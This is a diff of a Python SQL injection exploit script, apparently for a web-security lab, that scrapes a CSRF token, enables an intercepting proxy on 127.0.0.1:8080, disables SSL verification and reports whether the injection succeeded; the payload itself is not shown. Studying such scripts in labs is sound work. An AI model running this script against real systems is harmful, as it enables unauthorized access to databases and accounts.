@@ -5,21 +5,17 @@ import urllib3
 from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-""" proxies = {
+proxies = {
     'http':'http://127.0.0.1:8080', 
     'https':'http://127.0.0.1:8080'
 }
- """
-#SSL certificate verification False
-# to see the content of the response's payload in string format, we can use response.text
-
+ 
 def get_csrf_token(s,url):       
-    r = s.get(url, verify=False)    
+    r = s.get(url, verify=False)    #SSL certificate verification
     soup = BeautifulSoup(r.text, 'html.parser')
     csrf = soup.find("input")['value']
     print(csrf)
     return csrf
-
 
 def exploit_sqli(s, url, payload):
     csrf = get_csrf_token(s,url)
@@ -47,4 +43,4 @@ if __name__ == "__main__":
     if exploit_sqli(s, url, sqli_payload):
         print('[+] SQL injection was successful!')
     else:
-        print('[+] SQL injection was unsuccessful.')
+        print('[-] SQL injection was unsuccessful.')
